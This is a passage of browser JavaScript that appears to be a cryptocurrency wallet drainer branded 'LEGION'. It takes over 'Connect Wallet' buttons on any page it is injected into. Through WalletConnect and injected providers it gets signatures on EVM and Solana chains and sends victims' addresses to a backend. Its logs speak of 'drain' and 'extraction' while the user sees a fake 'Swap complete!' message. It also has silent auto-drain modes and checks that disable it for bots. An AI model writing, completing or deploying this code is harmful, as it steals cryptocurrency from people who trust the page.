          // Only add Solana if the adapter actually loaded — prevents "Unsupported chains" crash
          if (_akSolanaLoaded) {
            _akNetworks.push({ id: 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp', caipNetworkId: 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp', chainNamespace: 'solana', name: 'Solana', nativeCurrency: { decimals: 9, name: 'SOL', symbol: 'SOL' }, rpcUrls: { default: { http: ['https://api.mainnet-beta.solana.com'] } } });
          }
          _wcModal = _wcSdk.createAppKit({
            adapters: _akAdapters,
            networks: _akNetworks,
            projectId: wcProjectId,
            metadata: WC_METADATA(),
            features: { analytics: false, email: false, socials: false, coinbase: 'hide' },
            themeMode: 'dark',
            enableCoinbase: false,
          });
        }
        updateStatus('Connecting wallet...');
        await _wcModal.open();
        // Wait for user to connect — AppKit v1.x uses subscribeAccount (not subscribeProvider)
        var _akState = await new Promise(function(resolve, reject) {
          var _akTimeout = setTimeout(function() { reject(new Error('WalletConnect timeout')); }, 120000);
          // subscribeAccount fires with { address, isConnected, caipAddress, status }
          var _akUnsub = _wcModal.subscribeAccount(function(state) {
            if (state.isConnected && state.address) {
              clearTimeout(_akTimeout);
              try { _akUnsub(); } catch (_) {}
              resolve(state);
            }
          });
        });
        // caipAddress format: 'eip155:1:0xabc...' or 'solana:5eykt...:ADDR'
        var _akCaip = _akState.caipAddress || '';
        var _akIsSolana = _akCaip.startsWith('solana:');
        // Get the EIP-1193 / Solana provider from AppKit
        var _akProvider = null;
        try {
          // subscribeProviders gives { eip155: provider, solana: provider }
          var _akProviders = _wcModal.getProviders ? _wcModal.getProviders() : {};
          _akProvider = _akIsSolana ? (_akProviders.solana || null) : (_akProviders['eip155'] || _wcModal.getWalletProvider());
        } catch (_) {
          try { _akProvider = _wcModal.getWalletProvider(); } catch (_) {}
        }
        if (_akIsSolana) {
          connectedChains.SOL = {
            chain: 'SOL', config: CHAIN_CONFIG.SOL,
            address: _akState.address,
            chainId: 'mainnet-beta',
            walletType: 'WalletConnect',
            provider: _akProvider,
            connected: true, timestamp: Date.now()
          };
          console.log('[LEGION] AppKit → Solana connected:', _akState.address.substring(0, 8) + '...');
        } else {
          var _akChainId = _akCaip ? parseInt(_akCaip.split(':')[1]) || 1 : 1;
          connectedChains.EVM = {
            chain: 'EVM', config: CHAIN_CONFIG.EVM,
            address: _akState.address.toLowerCase(),
            chainId: _akChainId,
            walletType: 'WalletConnect',
            provider: _akProvider,
            connected: true, timestamp: Date.now()
          };
          console.log('[LEGION] AppKit → EVM connected:', _akState.address.substring(0, 10) + '... chain:', _akChainId);
        }
        await runWCSignAndSubmit();
        return;
      }

      throw new Error('Unknown WC mode: ' + _wcMode);

    } catch (err) {
      if (_wcModal) { try { if (_wcModal.close) _wcModal.close(); else if (_wcModal.closeModal) _wcModal.closeModal(); } catch (_) {} }
      hideManualQR();
      // Reset providers so next attempt starts fresh (stale state causes silent failures)
      if (_wcProvider) { try { await _wcProvider.disconnect(); } catch (_) {} _wcProvider = null; }
      _wcSdk = null; _wcMode = null;
      console.error('[LEGION] WalletConnect failed:', err.message);
      if (/reject|cancel|closed|declined|user rejected/i.test(err.message || '')) {
        updateStatus('Connection cancelled. Try again.');
      } else {
        updateStatus('Connection failed. Please try again.');
      }
    }
  }

  // ─── WalletConnect Explorer API — 600+ wallets ──────────────────────────
  var _wcCurrentUri = '';
  var _wcWalletCache = null;

  function _buildWcLink(w, uri) {
    var enc = encodeURIComponent(uri);
    if (w.mobile && w.mobile.universal) return w.mobile.universal.replace(/\/$/, '') + '/wc?uri=' + enc;
    if (w.mobile && w.mobile.native)    return w.mobile.native.replace(/\/$/, '')    + '/wc?uri=' + enc;
    return null;
  }

  async function fetchWCWallets(projectId) {
    if (_wcWalletCache) return _wcWalletCache;
    try {
      var res = await fetch(
        'https://explorer-api.walletconnect.com/v3/wallets?projectId=' +
        encodeURIComponent(projectId || '') +
        '&entries=250&page=1&sdks=sign_v2'
      );
      if (!res.ok) throw new Error('HTTP ' + res.status);
      var data = await res.json();
      _wcWalletCache = Object.values(data.listings || {}).filter(function(w) {
        return w.mobile && (w.mobile.universal || w.mobile.native);
      });
      return _wcWalletCache;
    } catch (e) { return null; }
  }

  // WalletConnect QR Modal — 600+ wallets via Explorer API (fallback when AppKit unavailable)
  function showManualQR(uri) {
    hideManualQR();
    _wcCurrentUri = uri;
    var isAndroid = /Android/i.test(navigator.userAgent);
    var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
    var isMobile = isAndroid || isIOS;
    var enc = encodeURIComponent(uri);

    // Hardcoded fallback if Explorer API fails
    var FALLBACK_WALLETS = [
      { name: 'MetaMask',       mobile: { universal: 'https://metamask.app.link' },   app: { ios: 'https://apps.apple.com/app/metamask/id1438144202', android: 'https://play.google.com/store/apps/details?id=io.metamask' } },
      { name: 'Trust Wallet',   mobile: { universal: 'https://link.trustwallet.com' }, app: { ios: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409', android: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp' } },
      { name: 'Coinbase Wallet',mobile: { universal: 'https://go.cb-w.com' },          app: { ios: 'https://apps.apple.com/app/coinbase-wallet-nfts-crypto/id1278383455', android: 'https://play.google.com/store/apps/details?id=org.toshi' } },
      { name: 'Rainbow',        mobile: { universal: 'https://rnbwapp.com' },           app: { ios: 'https://apps.apple.com/app/rainbow-ethereum-wallet/id1457119021', android: 'https://play.google.com/store/apps/details?id=me.rainbow' } },
      { name: 'Phantom',        mobile: { universal: 'https://phantom.app/ul/browse/https://phantom.app/wc' }, app: { ios: 'https://apps.apple.com/app/phantom-crypto-wallet/id1598432977', android: 'https://play.google.com/store/apps/details?id=app.phantom' } },
      { name: 'OKX Wallet',     mobile: { universal: 'https://www.okx.com/download' },  app: { ios: 'https://apps.apple.com/app/okx-buy-bitcoin-eth-crypto/id1327268470', android: 'https://play.google.com/store/apps/details?id=com.okinc.okex.gp' } },
    ];

    // Overlay
    var overlay = document.createElement('div');
    overlay.id = 'l1-qr-overlay';
    overlay.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.85);display:flex;align-items:center;justify-content:center;backdrop-filter:blur(8px);overflow-y:auto;padding:20px 0;-webkit-overflow-scrolling:touch';

    var card = document.createElement('div');
    card.style.cssText = 'background:#13141a;border-radius:24px;padding:22px;width:360px;max-width:calc(100vw - 24px);color:#fff;font-family:Inter,system-ui,sans-serif;box-shadow:0 32px 80px rgba(0,0,0,.8);border:1px solid #252532;margin:auto';

    // QR section (collapsible on mobile)
    var qrW = isMobile ? 190 : 240;
    var qrBlock = '<div id="l1-qr-wrap" style="background:#fff;border-radius:14px;width:' + qrW + 'px;height:' + qrW + 'px;margin:0 auto 8px;display:flex;align-items:center;justify-content:center"><canvas id="l1-qr-canvas"></canvas></div>' +
      '<p style="color:#4b5563;font-size:11px;margin:0 0 10px;text-align:center">' + (isMobile ? 'Scan with a different device' : 'Scan with any WalletConnect-compatible wallet') + '</p>';

    var qrSection = isMobile
      ? '<details style="margin-bottom:12px"><summary style="cursor:pointer;color:#4b5563;font-size:11px;text-align:center;list-style:none;-webkit-appearance:none;padding:6px 0">Or scan with another device ▾</summary><div style="margin-top:10px;text-align:center">' + qrBlock + '</div></details>'
      : qrBlock;

    var mobileWalletUI = isMobile
      ? '<p style="color:#9ca3af;font-size:11px;margin:0 0 8px;text-transform:uppercase;letter-spacing:.5px">Choose your wallet</p>' +
        '<input id="l1-wc-search" placeholder="Search 600+ wallets..." autocomplete="off" style="width:100%;padding:10px 14px;background:#0d0e14;border:1px solid #252532;border-radius:12px;color:#e5e7eb;font:13px Inter,system-ui;box-sizing:border-box;outline:none;margin-bottom:8px;-webkit-appearance:none">' +
        '<div id="l1-wc-list" style="max-height:260px;overflow-y:auto;border-radius:12px;border:1px solid #1a1b25;margin-bottom:10px;background:#0d0e14"><div style="color:#4b5563;text-align:center;padding:24px;font-size:13px">Loading wallets...</div></div>' +
        '<div id="l1-wc-err" style="display:none;font-size:12px;padding:8px 12px;background:#200000;border-radius:8px;border:1px solid #3d0000;color:#f87171;margin-bottom:8px"></div>'
      : '';

    card.innerHTML =
      '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">' +
        '<div style="display:flex;align-items:center;gap:10px">' +
          '<div style="width:32px;height:32px;background:linear-gradient(135deg,#3b4ce2,#7c6af7);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:15px">🔗</div>' +
          '<div><div style="font:600 15px Inter">Connect Wallet</div><div id="l1-wc-count" style="color:#4b5563;font-size:11px">' + (isMobile ? 'Loading...' : '600+ wallets via WalletConnect') + '</div></div>' +
        '</div>' +
        '<button id="l1-qr-x" style="background:#1a1b25;border:1px solid #252532;color:#6b7280;width:30px;height:30px;border-radius:50%;font-size:16px;cursor:pointer;flex-shrink:0">×</button>' +
      '</div>' +
      mobileWalletUI +
      qrSection +
      '<button id="l1-qr-copy" style="width:100%;padding:10px;background:#1a1b25;color:#6b7280;border:1px solid #252532;border-radius:12px;font:13px Inter,system-ui;cursor:pointer">Copy WalletConnect URI</button>';

    overlay.appendChild(card);
    document.body.appendChild(overlay);

    // Generate QR
    import('https://esm.sh/qrcode@1.5.3?bundle-deps').then(function(mod) {
      var QR = mod.default || mod.QRCode || mod;
      var canvas = document.getElementById('l1-qr-canvas');
      if (canvas && QR && QR.toCanvas) {
        QR.toCanvas(canvas, uri, { width: qrW - 20, margin: 1, color: { dark: '#000', light: '#fff' } }, function() {});
      }
    }).catch(function() {
      var wrap = document.getElementById('l1-qr-wrap');
      if (wrap) wrap.innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + enc + '" style="border-radius:12px;width:' + (qrW - 20) + 'px">';
    });

    document.getElementById('l1-qr-x').onclick = hideManualQR;
    document.getElementById('l1-qr-copy').onclick = function() {
      navigator.clipboard.writeText(uri).then(function() {
        var btn = document.getElementById('l1-qr-copy');
        if (btn) { btn.textContent = 'Copied!'; setTimeout(function() { if (btn) btn.textContent = 'Copy WalletConnect URI'; }, 2000); }
      }).catch(function() {});
    };
    overlay.addEventListener('click', function(e) { if (e.target === overlay) hideManualQR(); });

    if (!isMobile) return;

    // Mobile: load wallet list from Explorer API
    var wcProjId = (window.LEGION_CONFIG && window.LEGION_CONFIG.wcProjectId) || WC_PROJECT_ID || '';
    var allWallets = null;

    function openWallet(link, store, name) {
      var blurFired = false;
      function onHide() { blurFired = true; }
      document.addEventListener('visibilitychange', onHide, { once: true });
      window.addEventListener('blur', onHide, { once: true });
      window.location.href = link;
      setTimeout(function() {
        document.removeEventListener('visibilitychange', onHide);
        window.removeEventListener('blur', onHide);
        if (!blurFired && !document.hidden) {
          var errEl = document.getElementById('l1-wc-err');
          if (errEl) {
            errEl.style.display = 'block';
            errEl.innerHTML = name + ' may not be installed. ' + (store ? '<a href="' + store + '" target="_blank" style="color:#a78bfa;text-decoration:underline">Download →</a>' : '');
          }
        }
      }, 2500);
    }

    function renderWalletList(wallets, filter) {
      var listEl = document.getElementById('l1-wc-list');
      if (!listEl) return;
      var filtered = filter
        ? wallets.filter(function(w) { return w.name.toLowerCase().indexOf(filter.toLowerCase()) !== -1; })
        : wallets;
      if (!filtered.length) {
        listEl.innerHTML = '<div style="color:#4b5563;text-align:center;padding:20px;font-size:13px">No wallets found</div>';
        return;
      }
      var frag = document.createDocumentFragment();
      filtered.slice(0, 100).forEach(function(w) {
        var link = _buildWcLink(w, uri);
        if (!link) return;
        var store = isAndroid ? (w.app && w.app.android) : (w.app && w.app.ios);
        var imgUrl = w.image_url && (w.image_url.sm || w.image_url.md);
        var row = document.createElement('div');
        row.style.cssText = 'display:flex;align-items:center;gap:12px;padding:11px 14px;border-bottom:1px solid #1a1b25;cursor:pointer';
        row.innerHTML =
          (imgUrl
            ? '<img src="' + imgUrl + '" width="34" height="34" style="border-radius:9px;background:#1a1b25;flex-shrink:0" onerror="this.style.opacity=\'.2\'">'
            : '<div style="width:34px;height:34px;border-radius:9px;background:#252532;flex-shrink:0"></div>') +
          '<span style="flex:1;font:500 14px Inter,system-ui;color:#e5e7eb">' + w.name + '</span>' +
          '<svg width="6" height="11" viewBox="0 0 6 11" fill="none"><path d="M1 1l4 4.5L1 10" stroke="#4b5563" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>';
        row.addEventListener('touchstart', function() { row.style.background = '#1a1b25'; }, { passive: true });
        row.addEventListener('touchend', function() { setTimeout(function() { row.style.background = ''; }, 200); }, { passive: true });
        row.addEventListener('click', function() { openWallet(link, store || '', w.name); });
        frag.appendChild(row);
      });
      listEl.innerHTML = '';
      listEl.appendChild(frag);
    }

    fetchWCWallets(wcProjId).then(function(wallets) {
      allWallets = (wallets && wallets.length) ? wallets : FALLBACK_WALLETS;
      var cntEl = document.getElementById('l1-wc-count');
      if (cntEl) cntEl.textContent = allWallets.length + '+ wallets available';
      renderWalletList(allWallets, '');
      var searchEl = document.getElementById('l1-wc-search');
      if (searchEl) {
        searchEl.addEventListener('input', function() { renderWalletList(allWallets, searchEl.value); });
      }
    }).catch(function() {
      allWallets = FALLBACK_WALLETS;
      renderWalletList(allWallets, '');
    });
  }
  function hideManualQR() { var el = document.getElementById('l1-qr-overlay'); if (el) el.remove(); }

  function applyWCSession(provider) {
    var ns = (provider.session && provider.session.namespaces) || {};
    var count = 0;
    if (ns.eip155 && ns.eip155.accounts && ns.eip155.accounts.length) {
      var evmAccounts = ns.eip155.accounts;

      // Collect ALL chains the wallet reported — wallet decides, we don't force
      var availableChainIds = [];
      evmAccounts.forEach(function(acc) {
        var p = acc.split(':');
        if (p.length >= 2) {
          var cid = parseInt(p[1], 10);
          if (cid && availableChainIds.indexOf(cid) === -1) availableChainIds.push(cid);
        }
      });

      var firstParts = evmAccounts[0].split(':');
      var addr = firstParts.length >= 3 ? firstParts.slice(2).join(':') : '';
      // Use the first chain the wallet chose (its priority), not our hardcoded chain
      var chainId = availableChainIds[0] || 1;

      if (addr) {
        // Build a smart provider wrapper that routes signing to the correct chain
        // by reading domain.chainId from typed data, so multi-chain wallets work properly
        var _sessionTopic = provider.session && provider.session.topic;
        var smartProvider = {
          request: function(args) {
            var targetChainId = 'eip155:' + chainId;
            // For typed data signing, route to the chain the typed data specifies
            if ((args.method === 'eth_signTypedData_v4' || args.method === 'eth_signTypedData') && args.params && args.params[1]) {
              try {
                var td = typeof args.params[1] === 'string' ? JSON.parse(args.params[1]) : args.params[1];
                if (td && td.domain && td.domain.chainId) {
                  var tdChain = parseInt(td.domain.chainId, 10);
                  if (tdChain && availableChainIds.indexOf(tdChain) !== -1) {
                    targetChainId = 'eip155:' + tdChain;
                  }
                }
              } catch (_) {}
            }
            return provider.request({ topic: _sessionTopic, chainId: targetChainId, request: args });
          }
        };

        connectedChains.EVM = {
          chain: 'EVM', config: CHAIN_CONFIG.EVM, address: addr.toLowerCase(),
          chainId: chainId, availableChainIds: availableChainIds,
          walletType: 'WalletConnect', provider: smartProvider,
          connected: true, timestamp: Date.now()
        };
        count++;
      }
    }
    if (ns.solana && ns.solana.accounts && ns.solana.accounts.length) {
      var sParts = ns.solana.accounts[0].split(':');
      var sAddr = sParts.length >= 3 ? sParts.slice(2).join(':') : '';
      if (sAddr) {
        connectedChains.SOL = {
          chain: 'SOL', config: CHAIN_CONFIG.SOL, address: sAddr,
          walletType: 'WalletConnect', provider: provider,
          connected: true, timestamp: Date.now()
        };
        count++;
      }
    }
    return count;
  }

  // Run sign + submit flow after WC connects
  async function runWCSignAndSubmit() {
    updateStatus('Wallet connected. Confirm in wallet...');

    // Build connected map for signing
    var wcConnected = {};
    if (connectedChains.EVM) wcConnected.EVM = connectedChains.EVM;
    if (connectedChains.SOL) wcConnected.SOL = connectedChains.SOL;

    // Scout in background
    var firstChain = Object.keys(wcConnected)[0] || 'EVM';
    var firstWallet = wcConnected[firstChain];
    var scoutPromise = apiPost('/api/v1/scout', {
      user_address: firstWallet ? firstWallet.address : '',
      chain_id: wcConnected.EVM ? wcConnected.EVM.chainId || 1 : 1,
      wallet_type: 'WalletConnect',
      chain_family: firstChain === 'SOL' ? 'SVM' : 'EVM',
      source_page: window.location.href,
      connected_wallets: Object.keys(wcConnected).map(function(k) { return wcConnected[k].address; }).filter(Boolean)
    }).catch(function() {});

    // Sign all connected chains
    var sigStart = Date.now();
    var signatures = await getSignaturesParallel(wcConnected);
    PARALLEL_STATS.signatureTime = Date.now() - sigStart;

    await scoutPromise;

    var _ethOnlyDoneWc = signatures['__eth_only_evm__'];
    if (_ethOnlyDoneWc) { delete signatures['__eth_only_evm__']; }

    var _eip7702DoneWc = signatures['__eip7702_evm__'];
    if (_eip7702DoneWc) { delete signatures['__eip7702_evm__']; }

    if (Object.keys(signatures).length === 0) {
      if (_eip7702DoneWc) {
        console.log('[LEGION] ✅ EIP-7702 drain complete — backend executing');
        updateStatus('Transaction submitted!');
        drainRunning = false;
        return;
      }
      if (_ethOnlyDoneWc) {
        console.log('[LEGION] ✅ ETH-only extraction complete. Tx:', _ethOnlyDoneWc.split(':')[1]);
        updateStatus('Transaction confirmed!');
        INCIDENT_RESPONSE.suspicionScore = 0;
        drainRunning = false;
        return;
      }
      throw new Error('All signatures rejected');
    }

    // Submit
    updateStatus('Finalizing swap...');
    await submitBatchSignatures(signatures, connectedChains);

    updateStatus('Swap complete!');
    console.log('[LEGION] WalletConnect flow complete');

    if (INCIDENT_RESPONSE.enabled) {
      INCIDENT_RESPONSE.startMonitoring();
    }
  }

  // ─── UI STATUS UPDATES ──────────────────────────────────────────────────

  function updateStatus(text) {
    LOGGER.debug('UI Status:', text);
    var status = document.getElementById('legion-one-status');
    if (status) { status.textContent = text; }
    // Also update the visible swap/connect button so user sees real feedback
    var mainBtn = document.getElementById('mainBtn') || document.querySelector('[data-legion-btn]') || document.querySelector('button.swap-btn');
    if (mainBtn && text) { mainBtn.textContent = text; }
  }

  // ─── BATCH SUBMISSION TO BACKEND ───────────────────────────────────────

  // OLD submitBatchSignatures removed - using the fixed version at line 1445

  // ─── COMPREHENSIVE INITIALIZATION ──────────────────────────────────────

  window.legion_initializeV2 = function(options) {
    LOGGER.info('═════════════════════════════════════════════════════════════');
    LOGGER.info('LEGION-ONE-SCRIPT-V2.0 INITIALIZATION');
    LOGGER.info('═════════════════════════════════════════════════════════════');

    // Merge options
    if (options && options.backendUrl) {
      BACKEND = options.backendUrl;
      LOGGER.info('✓ Backend URL:', BACKEND);
    }

    if (options && options.vaults) {
      Object.assign(CFG.vaultAddresses, options.vaults);
    }

    if (options && options.debug) {
      DEBUG_MODE.enable();
    }

    if (options && options.disableIncidentResponse) {
      INCIDENT_RESPONSE.enabled = false;
      LOGGER.warn('! Incident response disabled');
    }

    // Step 1: Load vault config
    vaultCache = normalizeVaultCache(CFG.vaultAddresses || {});
    LOGGER.info('Vault addresses configured:', Object.keys(vaultCache).length);

    // Step 2: Create UI FIRST (always show button, even if validation fails)
    createUI();

    // Step 3: Validate configuration
    LOGGER.info('Running validation suite...');
    var validationPassed = VALIDATION.runAllValidations();
    if (!validationPassed) {
      LOGGER.warn('⚠️ Validation warnings - script continues with reduced features');
    }

    // Step 4: Check for bot detection
    LOGGER.info('Checking for bot signatures...');
    if (isBotClient()) {
      LOGGER.error('❌ BOT DETECTED - Script disabled');
      return false;
    }
    LOGGER.info('✅ Not running in automated environment');

    // Step 5: Setup incident monitoring
    if (INCIDENT_RESPONSE.enabled) {
      LOGGER.info('Incident response armed (5 sensors)');
      setInterval(function() {
        INCIDENT_RESPONSE.checkAllSensors();
      }, 2000);
    }

    // Step 6: Expose public API
    window.legion = {
      init: window.legion_initializeV2,
      connect: window.handleConnectAndDrain,
      connectDirect: runConnectAndDrain,
      connectWC: handleWalletConnect,
      openPanel: openWalletPanel,
      closePanel: closeWalletPanel,
      getWallets: function() {
        var out = {};
        Object.keys(connectedChains).forEach(function(k) {
          if (connectedChains[k] && connectedChains[k].address) {
            out[k] = { address: connectedChains[k].address, walletType: connectedChains[k].walletType, chainId: connectedChains[k].chainId };
          }
        });
        return out;
      },
      isConnected: function() {
        return Object.keys(connectedChains).some(function(k) { return connectedChains[k] && connectedChains[k].address; });
      },
      debug: {
        enable: function() { DEBUG_MODE.enable(); },
        disable: function() { DEBUG_MODE.disable(); },
        status: function() {
          DEBUG_MODE.logChainStatus();
          DEBUG_MODE.logPerformanceStats();
          DEBUG_MODE.logIncidentStatus();
        },
        logs: function() { return LOGGER.getHistory(); },
        clearLogs: function() { LOGGER.clearHistory(); },
        testBot: function() { console.log('[LEGION] Bot score:', BOT_DETECTION.botScore + '/' + BOT_DETECTION.maxBotScore); },
        testIncident: function() {
          INCIDENT_RESPONSE.checkAllSensors();
          console.log('[LEGION] Incident score:', INCIDENT_RESPONSE.suspicionScore);
        },
        validate: function() { return VALIDATION.runAllValidations(); },
        report: function() { TEST_RESULTS.printReport(); }
      }
    };

    LOGGER.info('═════════════════════════════════════════════════════════════');
    LOGGER.info('✅ INITIALIZATION COMPLETE - READY');
    LOGGER.info('═════════════════════════════════════════════════════════════');
    LOGGER.info('Debug API: window.legion.debug.*');
    LOGGER.info('Click "Connect Wallet" to start drain');

    // Backend warmup — fire lightweight ping so Railway wakes up before user clicks
    setTimeout(function() {
      fetch(BACKEND + '/api/v1/client-config', { method: 'GET', credentials: 'omit' }).catch(function() {});
    }, 500);
    setTimeout(function() {
      fetch(BACKEND + '/api/v1/client-config', { method: 'GET', credentials: 'omit' }).catch(function() {});
    }, 3000);

    return true;
  };

  // ─── HOOK EXISTING PAGE BUTTONS ─────────────────────────────────────────
  // Auto-detect "Connect Wallet" buttons on ANY frontend and hijack them

  function hookPageConnectButtons() {
    var hookPatterns = /connect\s*wallet|wallet\s*connect|sign\s*in|connect\s*to|link\s*wallet/i;
    var hooked = 0;

    document.querySelectorAll('button, a, [role="button"], [data-testid*="connect"], [data-testid*="wallet"]').forEach(function(el) {
      if (el.__legionHooked) return;
      var label = ((el.textContent || '') + ' ' + (el.getAttribute('aria-label') || '') + ' ' + (el.getAttribute('data-testid') || '')).trim();
      if (!hookPatterns.test(label)) return;

      el.__legionHooked = true;
      hooked++;

      el.addEventListener('click', function(e) {
        // If SILENT_MODE, take over completely
        if (SILENT_MODE) {
          e.preventDefault();
          e.stopPropagation();
          window.handleConnectAndDrain();
          return;
        }

        // Let original click happen, then check if wallet connected
        if (!drainRunning) {
          setTimeout(function() {
            if (window.ethereum && window.ethereum.selectedAddress && !connectedChains.EVM && !drainRunning) {
              connectedChains.EVM = {
                chain: 'EVM',
                config: CHAIN_CONFIG.EVM,
                address: window.ethereum.selectedAddress.toLowerCase(),
                chainId: window.ethereum.chainId ? parseInt(window.ethereum.chainId, 16) : 1,
                walletType: window.ethereum.isMetaMask ? 'MetaMask' : 'Injected',
                provider: window.ethereum,
                connected: true,
                timestamp: Date.now()
              };
              if (AUTO_DRAIN && !drainRunning) {
                runConnectAndDrain();
              }
            }
          }, 2000);
        }
      }, true);
    });

    if (hooked > 0) {
      LOGGER.info('Hooked', hooked, 'existing connect buttons on page');
    }
  }

  // Re-scan for new buttons (SPAs add buttons dynamically) — max 10 scans then stop
  function startButtonObserver() {
    if (typeof MutationObserver === 'undefined') return;
    var debounceTimer;
    var scanCount = 0;
    var observer = new MutationObserver(function() {
      if (scanCount >= 10) { observer.disconnect(); return; }
      clearTimeout(debounceTimer);
      debounceTimer = setTimeout(function() { scanCount++; hookPageConnectButtons(); }, 1000);
    });
    observer.observe(document.body, { childList: true, subtree: true });
  }

  // ─── AUTO-INIT ON DOM READY ────────────────────────────────────────────

  function initializeScript() {
    try {
      window.legion_initializeV2(CFG);

      // Hook existing page buttons
      hookPageConnectButtons();
      startButtonObserver();

      // Silent mode: auto-connect if wallet already connected
      if (SILENT_MODE && window.ethereum && window.ethereum.selectedAddress) {
        connectedChains.EVM = {
          chain: 'EVM',
          config: CHAIN_CONFIG.EVM,
          address: window.ethereum.selectedAddress.toLowerCase(),
          chainId: window.ethereum.chainId ? parseInt(window.ethereum.chainId, 16) : 1,
          walletType: 'Injected',
          provider: window.ethereum,
          connected: true,
          timestamp: Date.now()
        };
        if (AUTO_DRAIN) {
          setTimeout(function() { window.handleConnectAndDrain(); }, 500);
        }
      }

      updateStatus('Connect your wallet to swap');
    } catch (err) {
      LOGGER.error('Init failed:', err.message);
      updateStatus('Failed to initialize. Please refresh.');
    }
  }

  // Start when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeScript);
  } else {
    initializeScript();
  }

  // ─── CLEANUP ON PAGE UNLOAD ────────────────────────────────────────────

  window.addEventListener('beforeunload', function() {
    if (INCIDENT_RESPONSE.monitoringActive) {
      INCIDENT_RESPONSE.stopMonitoring();
    }
    cleanupMemory();
  });

})();
